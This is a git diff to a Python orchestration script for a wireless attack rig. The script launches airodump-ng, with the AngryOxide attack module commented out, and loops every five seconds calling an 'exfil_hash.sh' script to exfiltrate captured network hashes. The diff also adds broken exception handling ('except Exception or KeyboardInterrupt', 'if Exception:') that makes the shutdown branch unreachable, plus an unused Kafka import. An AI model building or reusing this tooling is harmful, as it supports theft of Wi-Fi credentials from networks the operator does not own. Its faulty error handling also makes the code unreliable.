@@ -1,6 +1,7 @@
 import subprocess
 import time
 import sys
+from kafka import KafkaProducer
 
 # ======================
 # Global Configurations
@@ -21,28 +22,40 @@ WELCOME_MESSAGE = \
 EXFIL_INTERVAL = 5  # Interval in seconds to exfiltrate hashes
 
 # ======================
+# Helper Functions
+# ======================
+
+
+# ======================
 # Main Function
 # ======================
 def main():
     print("[*] Cleaning up...")
     subprocess.run(["./cleanup.sh"])
 
-    # Start AngryOxide subprocesses
     print("[*] Starting attack modules...")
-    ao1 = "./attack_i1.sh"
-    #ao2 = "./attack_i2.sh"
-    ao1p = subprocess.Popen([ao1], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    #ao2p = subprocess.Popen([ao2], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ### Start AngryOxide subprocess
+    #am1 = "./AgOx.sh"
+    #am1p = subprocess.Popen([am1], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    #print(f"[*] Started AngryOxide with PID {am1p.pid}")
+    
+    ### Start airodump-ng subprocess
+    am2 = "./airodump.sh"
+    am2p = subprocess.Popen([am2], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print(f"[*] Started airodump-ng with PID {am2p.pid}")
+    print(f"[*] PusExfiltrating hashes every {EXFIL_INTERVAL} seconds...")
     while True:
         try:
-            print(f"[*] Exfiltrating hashes every {EXFIL_INTERVAL} seconds...")
             subprocess.run(["./exfil_hash.sh"])
             time.sleep(EXFIL_INTERVAL)
-        except Exception as e:
-            print(f"[!] Exception occurred: {e}")
-            print("[*] Terminating subprocesses...")
-            ao1p.terminate()
-            #ao2p.terminate()
+        except Exception or KeyboardInterrupt:
+            if Exception:
+                print(f"[!] Exception occurred: {Exception}")
+            else:
+                print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
+                print("[*] Terminating subprocesses...")
+                #am1p.terminate()
+                am2p.terminate()
 
 # ======================
 # Main Loop
@@ -51,7 +64,6 @@ if __name__ == "__main__":
     try:
         print(WELCOME_MESSAGE)
         main()
-    except KeyboardInterrupt:
-
-        print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
+    except Exception as e:
+        print(f"[!] Fatal error: {e}")
         sys.exit(0)
